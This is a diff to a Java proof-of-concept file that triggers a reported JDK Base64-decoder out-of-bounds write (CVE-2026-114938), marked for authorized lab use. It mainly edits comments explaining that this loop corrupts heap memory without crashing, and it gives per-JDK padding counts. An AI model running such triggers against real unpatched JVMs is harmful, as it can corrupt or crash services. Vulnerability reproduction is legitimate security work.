@@ -1,17 +1,21 @@
 /*
- * Base64Trigger.java  -  CVE-2026-114938 (Java4Shell) crash reproducer.
+ * Base64Trigger.java  -  CVE-2026-114938 (Java4Shell) bare trigger loop.
  *
  * AUTHORIZED LAB USE ONLY.
  *
  * Decodes a malformed Base64 string whose length is not a multiple of four. On a vulnerable
  * JDK running on an AVX-512 VBMI CPU, the optimized decoder computes a negative output
- * length, builds an all-ones write mask, and stores 64 bytes past its output buffer; the
- * JVM then crashes (SIGSEGV) and writes an hs_err_pid log. On a patched JDK, or on a CPU
- * without AVX-512 VBMI, it only throws IllegalArgumentException and never crashes.
+ * length, builds an all-ones write mask, and stores 64 bytes past its output buffer.
  *
- * Run with a collected error file:
+ * This loop performs the bad write but, in the lab, did NOT crash the JVM even after
+ * about 118 million iterations: the overflow lands in heap memory nothing reads back.
+ * Use it to exercise the vulnerable path. To get an actual crash and an hs_err file,
+ * use Base64Crash.java, which adds the heap pressure that turns corruption into a fault.
+ * On a patched JDK, or a CPU without AVX-512 VBMI, both only throw IllegalArgumentException.
+ *
+ * Run:
  *   javac Base64Trigger.java
- *   java -XX:ErrorFile=/var/log/jvm/hs_err_pid%p.log Base64Trigger 64
+ *   java Base64Trigger 64
  *
  * Padding count: 64 for JDK 21/25/27, 128 for JDK 17.
  */
@@ -26,7 +30,7 @@ public class Base64Trigger {
         byte[] payload = sb.toString().getBytes();
 
         System.out.println("[*] payload length = " + payload.length + " (not a multiple of 4)");
-        System.out.println("[*] warming the Base64 intrinsic; a vulnerable JVM will crash...");
+        System.out.println("[*] looping the trigger; expect no crash from this loop alone (see Base64Crash)...");
 
         Base64.Decoder dec = Base64.getDecoder();
         long i = 0;
